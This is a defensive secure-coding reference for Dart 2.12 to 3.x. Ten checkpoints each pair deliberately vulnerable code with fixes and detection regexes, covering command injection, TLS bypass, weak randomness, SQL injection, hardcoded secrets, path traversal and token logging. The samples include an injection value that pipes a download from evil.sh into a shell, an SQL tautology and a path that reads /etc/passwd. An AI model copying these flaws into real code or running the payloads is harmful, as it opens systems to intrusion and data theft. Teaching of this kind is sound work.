# Dart Security Features by Version

Modern Dart (3.x) ships sound null safety, an isolate-based concurrency model with no shared mutable state, and a capability-scoped core library (`dart:io`, `dart:isolate`) that make whole classes of memory-corruption bugs impossible. Real Dart vulnerabilities are therefore almost always *logic-level*: shelling out with attacker-controlled strings, disabling TLS validation "temporarily", building SQL or file paths by string interpolation, and baking secrets into `const` declarations that survive in every compiled binary. This reference documents the security-relevant patterns for Dart 2.12+ (null safety) through Dart 3.x, paired with checkpoints SA-DART-01 through SA-DART-10.

## Dart 3.x Security Model

- **Sound null safety (2.12+, enforced in 3.0)** removes null-dereference crashes as a DoS vector, but only if code avoids the `!` bang operator on untrusted data.
- **Isolates** share nothing by default; message passing copies data. This confines memory disclosure, but `Isolate.spawnUri` can load and execute code from an arbitrary URI — a designed-in RCE primitive that must never see untrusted input.
- **String interpolation (`$var` / `${expr}`)** is the idiomatic way to build strings, which makes injection mistakes *look* idiomatic. Every interpolation into a command, query, path, or URL is a finding until proven otherwise.
- **`dart compile exe` / Flutter release builds** embed all `const` strings in the binary. `strings app | grep -i key` recovers every hardcoded credential.

## Core Dart Security Patterns

### 1. Command Injection via Process.run / Process.start (CWE-78) — SA-DART-01

`Process.run` and `Process.start` are safe when given a fixed executable and a list of arguments, because arguments are passed to the OS without shell parsing. Both `runInShell: true` and the explicit `'sh', ['-c', ...]` idiom reintroduce the shell — and with it, injection via `;`, `&&`, `$()`, and backticks.

```dart
// VULNERABLE: user input spliced into a shell command line
import 'dart:io';

Future<String> compressLogs(String userDir) async {
  final result =
      await Process.run('sh', ['-c', 'tar czf /tmp/logs.tgz $userDir']);
  return result.stdout as String;
  // userDir = "x; curl evil.sh | sh" executes arbitrary commands
}

// VULNERABLE: runInShell hands the whole line to cmd.exe / /bin/sh
Future<void> ping(String host) async {
  await Process.start('ping', ['-c', '4', host], runInShell: true);
}
```

```dart
// SECURE: fixed executable, fixed argument list, no shell
import 'dart:io';

final RegExp _dirName = RegExp(r'^[A-Za-z0-9_-]+$');

Future<String> compressLogs(String userDir) async {
  if (!_dirName.hasMatch(userDir)) {
    throw ArgumentError('invalid directory name');
  }
  final result =
      await Process.run('tar', ['czf', '/tmp/logs.tgz', userDir]);
  return result.stdout as String;
}

Future<void> ping(String host) async {
  await Process.start('ping', ['-c', '4', host], runInShell: false);
}
```

**Security implication:** With the argument-list form, `userDir` is delivered as a single argv entry — metacharacters are inert. With a shell in the loop, any interpolated value becomes executable syntax. Validate inputs even in the safe form: an attacker-chosen argument like `--checkpoint-action=exec=sh` can still weaponize some binaries (argument injection).

**Detection regex:** `Process\.(run|runSync|start)\s*\([^)]*runInShell\s*:\s*true|Process\.(run|runSync|start)\s*\(\s*['"](sh|bash|/bin/sh|/bin/bash|cmd|cmd\.exe|powershell)['"]\s*,\s*\[\s*['"](-c|/c|/C)['"]`
**Checkpoint:** SA-DART-01
**Severity:** error

### 2. TLS Certificate Validation Bypass (CWE-295) — SA-DART-02

`HttpClient.badCertificateCallback` decides what happens when certificate validation fails. Returning `true` unconditionally — the classic "fix" for a corporate proxy or a self-signed staging cert — silently accepts every forged certificate and turns all TLS traffic into plaintext for an on-path attacker.

```dart
// VULNERABLE: accepts every certificate, including a MITM proxy's forgery
import 'dart:io';

HttpClient createSyncClient() {
  final client = HttpClient();
  client.badCertificateCallback =
      (X509Certificate cert, String host, int port) => true;
  return client;
}
```

```dart
// SECURE: pin the expected certificate; reject everything else
import 'dart:io';

const String kPinnedFingerprint =
    '4f8ae2b9c1d0e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8';

String _hexDigest(List<int> der) {
  final buffer = StringBuffer();
  for (final byte in der) {
    buffer.write(byte.toRadixString(16).padLeft(2, '0'));
  }
  return buffer.toString();
}

HttpClient createSyncClient() {
  final client = HttpClient();
  client.badCertificateCallback =
      (X509Certificate cert, String host, int port) =>
          _hexDigest(cert.der) == kPinnedFingerprint;
  return client;
}

// SECURE (self-signed dev CA): trust the specific CA, not everything
SecurityContext devContext() {
  return SecurityContext(withTrustedRoots: true)
    ..setTrustedCertificates('assets/dev-ca.pem');
}
```

**Security implication:** A trust-all callback defeats the only guarantee TLS provides against active attackers. Session tokens, credentials, and API payloads become interceptable on any hostile network (public Wi-Fi, compromised routers). Pin the certificate or add the private CA to a `SecurityContext` instead.

**Detection regex:** `badCertificateCallback\s*=[^;{]*=>\s*true\b|badCertificateCallback\s*=[^;]*\{\s*return\s+true\b`

The `true` must be unconditional: either an arrow body (`=> true`) or a block whose first statement is `return true`. A pinning callback that conditionally returns true after a fingerprint comparison (`{ if (digest == pin) return true; return false; }`) is not flagged.

**Checkpoint:** SA-DART-02
**Severity:** error

### 3. Predictable Randomness with math.Random (CWE-338) — SA-DART-03

`Random()` from `dart:math` is a 64-bit xorshift PRNG seeded from the clock. Its output is reproducible by anyone who can estimate the seed or observe a few outputs. `Random.secure()` delegates to the OS CSPRNG and is the only acceptable source for security material.

```dart
// VULNERABLE: session tokens from a clock-seeded PRNG
import 'dart:math';

String generateToken() {
  final rng = Random();
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  return List.generate(32, (_) => chars[rng.nextInt(chars.length)]).join();
}

// VULNERABLE: seeding with the timestamp makes it trivially brute-forceable
String generateResetCode() {
  final seeded = Random(DateTime.now().millisecondsSinceEpoch);
  return (100000 + seeded.nextInt(900000)).toString();
}
```

```dart
// SECURE: OS-backed CSPRNG for anything an attacker gains from guessing
import 'dart:math';

String generateToken() {
  final rng = Random.secure();
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  return List.generate(32, (_) => chars[rng.nextInt(chars.length)]).join();
}
```

**Security implication:** Password-reset codes, session identifiers, nonces, and CSRF tokens generated with `Random()` can be predicted, enabling account takeover. `Random.secure()` throws `UnsupportedError` only on platforms without an entropy source — treat that as fatal, never fall back to `Random()`.

**Detection regex:** `\bRandom\s*\(`
**Checkpoint:** SA-DART-03
**Severity:** warning

### 4. SQL Injection in sqflite Raw Queries (CWE-89) — SA-DART-04

sqflite's `rawQuery` / `rawInsert` / `rawUpdate` / `rawDelete` execute SQL verbatim. Interpolating or concatenating values into the SQL string is injection; the `?` placeholder with a bind-argument list is the parameterized alternative and works in every raw method.

```dart
// VULNERABLE: interpolation and concatenation build attacker-controlled SQL
Future<List<Map<String, Object?>>> search(Database db, String term) {
  return db.rawQuery("SELECT * FROM notes WHERE title LIKE '%$term%'");
  // term = "%' OR 1=1 --" dumps the table
}

Future<int> rename(Database db, int id, String title) {
  return db.rawUpdate("UPDATE notes SET title = '" + title + "' WHERE id = $id");
}
```

```dart
// SECURE: ? placeholders with bind arguments in every raw call
Future<List<Map<String, Object?>>> search(Database db, String term) {
  return db.rawQuery('SELECT * FROM notes WHERE title LIKE ?', ['%$term%']);
}

Future<int> rename(Database db, int id, String title) {
  return db.rawUpdate('UPDATE notes SET title = ? WHERE id = ?', [title, id]);
}

// SECURE: the structured helpers parameterize for you
Future<int> add(Database db, String title, String body) {
  return db.insert('notes', {'title': title, 'body': body});
}
```

**Security implication:** Mobile SQLite databases hold cached credentials, message history, and offline business data. Injection through a search box or sync payload reads or corrupts all of it. Interpolating into the *values* list (`['%$term%']`) is safe — the driver binds it as data.

**Detection regex:** `\b(rawQuery|rawInsert|rawUpdate|rawDelete)\s*\(\s*("[^"]*(=|>|<|\bLIKE\b|\bIN\b|\bVALUES\b)[^"]*\$|'[^']*(=|>|<|\bLIKE\b|\bIN\b|\bVALUES\b)[^']*\$|"[^"]*"\s*\+\s*[A-Za-z_(]|'[^']*'\s*\+\s*[A-Za-z_(])`

The interpolation arm requires the `$` to appear *after* a comparison operator or `LIKE`/`IN`/`VALUES` keyword, so the common and safe idiom of interpolating a compile-time table-name constant (`'SELECT * FROM $tableUsers WHERE id = ?'`) is not flagged. The concatenation arm requires an identifier or expression after the `+`, so splitting a long query across lines by concatenating two string *literals* is not flagged.

**Checkpoint:** SA-DART-04
**Severity:** error

### 5. Hardcoded Secrets in const/final Declarations (CWE-798) — SA-DART-05

Every `const`/`final` string literal survives compilation. `strings` on an AOT binary, or any decompiler on a Flutter APK/IPA, recovers hardcoded passwords, tokens, and signing keys in seconds.

```dart
// VULNERABLE: credentials baked into the binary
class ApiConfig {
  static const dbPassword = 'Sup3rS3cretDbPass1';
  final String jwtSecret = 'hmac-signing-key-2024-rotateme';
}
```

```dart
// SECURE: inject at build time or read from the platform environment
import 'dart:io';

class ApiConfig {
  // dart run --define=API_TOKEN=... / flutter build --dart-define=API_TOKEN=...
  static const String apiToken = String.fromEnvironment('API_TOKEN');

  String get dbPassword {
    final value = Platform.environment['DB_PASS'];
    if (value == null || value.isEmpty) {
      throw StateError('DB_PASS is not set');
    }
    return value;
  }
}
```

**Security implication:** A leaked signing or API secret compromises every install at once and cannot be rotated without shipping a new release. Note that `String.fromEnvironment` still embeds the value in the artifact — it moves the secret out of *source control*, which is the goal for server-side Dart; for mobile clients, secrets that must stay secret belong on the backend or in platform secure storage (see SA-FLUTTER-02).

**Detection regex:** `(const|final)\s+(String\s+)?[a-zA-Z_]*([Pp]assword|[Ss]ecret|[Tt]oken|[Pp]asswd|[Pp]wd)[a-zA-Z0-9_]*\s*=\s*['"][A-Za-z0-9_=-]*([A-Za-z0-9=-]*[0-9][A-Za-z0-9=-]{7,}|[A-Za-z0-9=-]{7,}[0-9][A-Za-z0-9=-]*)[A-Za-z0-9_=-]*['"]`

The value must contain an underscore-free run of eight or more characters that includes a digit. This skips the ubiquitous benign constants that merely *name* a credential — preference keys (`const tokenKey = 'access_token';`), versioned keys (`'auth_token_v2'`, `'session_token_2024'`), and form-field identifiers (`final passwordField = 'password';`) — while still matching realistic secrets such as `'Sup3rS3cretDbPass_2026'`, whose digit-bearing runs are long.

**Checkpoint:** SA-DART-05
**Severity:** error

### 6. Plaintext HTTP Endpoints (CWE-319) — SA-DART-06

Cleartext `http://` URLs expose credentials, session tokens, and payloads to every network hop. Both Android (cleartext blocked by default since API 28) and iOS (ATS) already fight this; a hardcoded `http://` URL usually means someone added an exemption rather than fixing the endpoint.

```dart
// VULNERABLE: login credentials sent over cleartext HTTP
class AuthApi {
  static const String baseUrl = 'http://api.acme-corp.com/v2';

  Future<String> login(String username, String password) async {
    final response = await http.post(
      Uri.parse('$baseUrl/login'),
      body: jsonEncode({'username': username, 'password': password}),
    );
    return jsonDecode(response.body)['sessionToken'] as String;
  }
}
```

```dart
// SECURE: TLS for every non-localhost endpoint
class AuthApi {
  static const String baseUrl = 'https://api.acme-corp.com/v2';
  // Local development against an emulator loopback is the only exemption:
  static const String devUrl = 'http://localhost:8080/v2';
}
```

**Security implication:** Anything sent over `http://` is readable and modifiable by on-path attackers — captive portals, ISPs, and public Wi-Fi included. The detection pattern deliberately targets public TLDs and skips `localhost`/loopback addresses used in development.

**Detection regex:** `(Uri\.parse\s*\(\s*|[a-zA-Z0-9_]*([Uu]rl|[Uu]ri|[Ee]ndpoint|[Hh]ost|[Bb]ase)[a-zA-Z0-9_]*\s*[:=]\s*)['"]http://[a-zA-Z0-9.-]+\.(com|net|org|io|dev|co|app|cloud|ai)|\bUri\.http\s*\(`

The literal-URL arm is anchored to `Uri.parse(` or an assignment to a URL-flavored identifier (`*url*`, `*Uri*`, `*endpoint*`, `*host*`, `*base*`), so non-endpoint identifiers that merely look like URLs — XML namespace constants such as `'http://www.w3.org/2000/svg'` — do not trigger it. The `Uri.http(` constructor arm flags the API that always builds a cleartext URL.

**Checkpoint:** SA-DART-06
**Severity:** warning

### 7. Weak Hashing with MD5/SHA-1 (CWE-327, CWE-916) — SA-DART-07

`package:crypto` exposes `md5` and `sha1` for legacy interop. Both are collision-broken, and both are so fast that GPU rigs test billions of password guesses per second — the opposite of what a password store needs.

```dart
// VULNERABLE: fast broken digest as a password hash
import 'dart:convert';
import 'package:crypto/crypto.dart';

String hashPassword(String password) {
  return md5.convert(utf8.encode(password)).toString();
}

// VULNERABLE: HMAC over a broken hash for new designs
final mac = Hmac(sha1, keyBytes);
```

```dart
// SECURE: an adaptive KDF for credentials, sha256 for integrity
import 'package:bcrypt/bcrypt.dart';
import 'package:crypto/crypto.dart';

String hashPassword(String password) {
  return BCrypt.hashpw(password, BCrypt.gensalt());
}

bool verifyPassword(String password, String stored) {
  return BCrypt.checkpw(password, stored);
}

String fileChecksum(List<int> bytes) {
  // sha256 is fine for content integrity, never for passwords
  return sha256.convert(bytes).toString();
}
```

**Security implication:** Leaked MD5/SHA-1 password tables fall to offline cracking in hours. Use bcrypt, scrypt, Argon2, or PBKDF2 (all available via pub packages) for credentials; SHA-256+ for integrity; and never MD5/SHA-1 in new signature or certificate code.

**Detection regex:** `\b(md5|sha1)\s*\.\s*convert\s*\(|\bHmac\s*\(\s*(md5|sha1)\s*,`
**Checkpoint:** SA-DART-07
**Severity:** warning

### 8. Remote Code Loading via Isolate.spawnUri (CWE-829, CWE-94) — SA-DART-08

`Isolate.spawnUri` starts a new isolate from a Dart library at an arbitrary URI. Pointing it at a remote URL — or at a URI assembled from configuration or user input — is remote code execution by design: the fetched code runs with the full privileges of the host process.

```dart
// VULNERABLE: downloads and executes Dart code from a CDN at runtime
import 'dart:isolate';

Future<void> runRemotePlugin(String pluginName, List<String> args) async {
  final receivePort = ReceivePort();
  await Isolate.spawnUri(
    Uri.parse('https://plugins.acme-corp.com/$pluginName/main.dart'),
    args,
    receivePort.sendPort,
  );
  // Anyone who controls that host or the DNS answer owns the process.
}
```

```dart
// SECURE: only entry points compiled into the application
import 'dart:isolate';

void workerMain(SendPort port) {
  port.send('ready');
}

Future<void> startWorker(List<String> args) async {
  final receivePort = ReceivePort();
  await Isolate.spawn(workerMain, receivePort.sendPort);
}

// SECURE (Dart 2.19+): Isolate.run for one-shot background work
Future<int> checksum(List<int> data) =>
    Isolate.run(() => data.fold(0, (sum, b) => (sum + b) & 0xffffffff));
```

**Security implication:** `spawnUri` bypasses code signing, store review, and supply-chain controls in one call. The checkpoint flags *every* `Isolate.spawnUri` call: even local-file uses deserve an audit, because the URI's integrity becomes a security boundary. Plugin systems should ship code inside the artifact and select entry points by name.

**Detection regex:** `Isolate\.spawnUri\s*\(`
**Checkpoint:** SA-DART-08
**Severity:** error

### 9. Path Traversal via File() from User Input (CWE-22) — SA-DART-09

`File()` performs no path containment. Concatenating or interpolating request data into a path lets `../` sequences walk out of the intended directory — the classic traversal that turns a download endpoint into `GET /etc/passwd`.

```dart
// VULNERABLE: query parameter interpolated straight into a path
import 'dart:io';

Future<void> handleDownload(HttpRequest request) async {
  final file = File('/srv/uploads/${request.uri.queryParameters['file']}');
  // ?file=../../../etc/passwd escapes the uploads directory
  await file.openRead().pipe(request.response);
}

Future<String> readUserNotes(String userInput) {
  return File('/data/notes/' + userInput).readAsString();
}
```

```dart
// SECURE: strip directory components, then verify containment
import 'dart:io';
import 'package:path/path.dart' as p;

const String uploadsRoot = '/srv/uploads';

Future<void> handleDownload(HttpRequest request) async {
  final requested = request.uri.queryParameters['file'] ?? '';
  final safeName = p.basename(requested);
  final resolved = p.normalize(p.join(uploadsRoot, safeName));
  if (!p.isWithin(uploadsRoot, resolved)) {
    request.response.statusCode = HttpStatus.forbidden;
    await request.response.close();
    return;
  }
  await File(resolved).openRead().pipe(request.response);
}
```

**Security implication:** Traversal reads configuration, key material, and other users' data; in write paths it plants files (webshells, cron entries). `p.basename` removes directory components, and `p.isWithin` after `p.normalize` is the containment proof — do both, since basename alone does not protect joins of multiple user-supplied segments.

**Detection regex:** `\bFile\s*\(\s*['"][^'"]*\$\{?(request|params|query|input|user(Input|Name|File|Path|Id)?\b)|\bFile\s*\([^)]*\+\s*(request|params|query|input|user(Input|Name|File|Path|Id)?\b)`

The leading `\b` restricts the match to the `dart:io` `File` constructor itself; wrapper types whose names merely end in `File` (`XFile` from cross_file, `ZipFile`, `PlatformFile`) perform no filesystem access at construction and are not flagged. The `user` token matches only bare `$user` or tainted compounds (`$userInput`, `$userName`, `$userFile`, `$userPath`, `$userId`); environment-derived prefixes such as `$userHome` are not flagged.

**Checkpoint:** SA-DART-09
**Severity:** error

### 10. Sensitive Data in Logs (CWE-532) — SA-DART-10

`print` writes to stdout — captured by process managers, CI logs, and on mobile by the shared system log that other tooling can read. `jsonEncode` of a credentials or session object dumps every field, including the ones you forgot were in there.

```dart
// VULNERABLE: tokens and whole session objects in the log stream
import 'dart:convert';

void onLoginSuccess(Map<String, dynamic> session) {
  final accessToken = session['access_token'] as String;
  print('login ok, token: $accessToken');
  print(jsonEncode(session)); // dumps refresh token, email, everything
}
```

```dart
// SECURE: log identifiers and metadata, never the secret material
import 'dart:convert';

void onLoginSuccess(Map<String, dynamic> session) {
  final userId = session['user_id'] as String;
  print('login ok for user $userId, expires ${session['expires_in']}s');
  final audit = jsonEncode({'user_id': userId, 'event': 'login'});
  writeAuditRecord(audit);
}
```

**Security implication:** Logs outlive sessions and flow into third-party aggregators with far weaker access control than your database. A token in a log line is a credential leak with a long shelf life. Redact at the log-call site; do not rely on downstream scrubbing.

**Detection regex:** `\b(print|log|debugPrint)\s*\(\s*jsonEncode\s*\(\s*[a-zA-Z_]*([Cc]redential|[Aa]uth|[Tt]oken|[Ss]ecret|[Uu]ser)s?\b|\bprint\s*\([^)]*\$\{?[a-zA-Z_.]*([Pp]assword|[Tt]oken|[Ss]ecret|[Aa]pi[Kk]ey)s?\b`

The trailing `s?\b` requires the sensitive word to end the identifier (plural allowed), so counters and unrelated names such as `print('$tokenCount entries')` or `jsonEncode(userPrefs)` are not flagged. Interpolated `debugPrint` credentials are the Flutter-level SA-FLUTTER-06.

**Checkpoint:** SA-DART-10
**Severity:** warning

## Detection Patterns for Auditing Dart Version Features

| Pattern | Regex | Severity | Checkpoint ID |
|---------|-------|----------|---------------|
| Shell command injection | `Process\.(run\|runSync\|start)\s*\([^)]*runInShell\s*:\s*true` (or shell + `['-c'` argument-list form) | error | SA-DART-01 |
| TLS trust-all callback | `badCertificateCallback\s*=[^;{]*=>\s*true\b` (block-body `\{\s*return\s+true` variant too) | error | SA-DART-02 |
| Predictable randomness | `\bRandom\s*\(` | warning | SA-DART-03 |
| sqflite raw SQL interpolation | `\b(rawQuery\|rawInsert\|rawUpdate\|rawDelete)\s*\(\s*("[^"]*(=\|>\|<\|\bLIKE\b\|\bIN\b\|\bVALUES\b)[^"]*\$\|'[^']*(=\|>\|<\|\bLIKE\b\|\bIN\b\|\bVALUES\b)[^']*\$\|"[^"]*"\s*\+\s*[A-Za-z_(]\|'[^']*'\s*\+\s*[A-Za-z_(])` ($ after an operator/keyword, or concat with a non-literal) | error | SA-DART-04 |
| Hardcoded credential | `(const\|final)\s+(String\s+)?[a-zA-Z_]*([Pp]assword\|[Ss]ecret\|[Tt]oken\|[Pp]asswd\|[Pp]wd)[a-zA-Z0-9_]*\s*=\s*['"][A-Za-z0-9_=-]*([A-Za-z0-9=-]*[0-9][A-Za-z0-9=-]{7,}\|[A-Za-z0-9=-]{7,}[0-9][A-Za-z0-9=-]*)[A-Za-z0-9_=-]*['"]` (value needs an 8+ char digit-bearing run without underscores) | error | SA-DART-05 |
| Plaintext HTTP endpoint | `(Uri\.parse\s*\(\s*\|[a-zA-Z0-9_]*([Uu]rl\|[Uu]ri\|[Ee]ndpoint\|[Hh]ost\|[Bb]ase)[a-zA-Z0-9_]*\s*[:=]\s*)['"]http://[a-zA-Z0-9.-]+\.(com\|net\|org\|io\|dev\|co\|app\|cloud\|ai)\|\bUri\.http\s*\(` (endpoint context required) | warning | SA-DART-06 |
| Weak hash (md5/sha1) | `\b(md5\|sha1)\s*\.\s*convert\s*\(\|\bHmac\s*\(\s*(md5\|sha1)\s*,` | warning | SA-DART-07 |
| Isolate code loading | `Isolate\.spawnUri\s*\(` | error | SA-DART-08 |
| Path traversal via File() | `\bFile\s*\(\s*['"][^'"]*\$\{?(request\|params\|query\|input\|user(Input\|Name\|File\|Path\|Id)?\b)` (concat variant too; `\b` excludes XFile/ZipFile wrappers and `$userHome`-style prefixes) | error | SA-DART-09 |
| Sensitive data in logs | `\b(print\|log\|debugPrint)\s*\(\s*jsonEncode\s*\(\s*[a-zA-Z_]*([Cc]redential\|[Aa]uth\|[Tt]oken\|[Ss]ecret\|[Uu]ser)s?\b` (print-interpolation variant too, both with `s?\b` word-end guard) | warning | SA-DART-10 |

## Version Adoption Security Checklist

- [ ] Migrate to Dart 3.x with sound null safety; remove `!` operators on values derived from untrusted input
- [ ] Replace every `Random()` used for tokens, codes, or nonces with `Random.secure()`
- [ ] Grep for `runInShell` and shell `-c` invocations; convert to fixed argument lists
- [ ] Delete `badCertificateCallback` trust-all handlers before release; pin or use `SecurityContext.setTrustedCertificates`
- [ ] Convert all sqflite raw queries to `?` placeholders with bind arguments
- [ ] Move credentials out of `const`/`final` literals into `--define`/`--dart-define` or platform secure storage
- [ ] Enforce `https://` for all non-localhost endpoints
- [ ] Replace md5/sha1 password hashing with bcrypt/Argon2/PBKDF2
- [ ] Audit every `Isolate.spawnUri` call; prefer `Isolate.spawn`/`Isolate.run` with compiled-in entry points
- [ ] Wrap file access behind `p.basename` + `p.isWithin` containment checks
- [ ] Sweep `print`/`log` calls for interpolated tokens, passwords, and `jsonEncode` dumps

## Related References

- `owasp-top10.md` — OWASP Top 10 mapping
- `cwe-top25.md` — CWE Top 25 mapping
- `input-validation.md` — Input validation patterns
- `path-traversal-prevention.md` — Path containment techniques
- `cryptography-guide.md` — Hash and KDF selection
- `flutter-security.md` — Flutter framework patterns (SA-FLUTTER namespace)

## Changelog

| Date | Change | Reason |
|------|--------|--------|
| 2026-07-20 | Initial release | Coverage expansion |
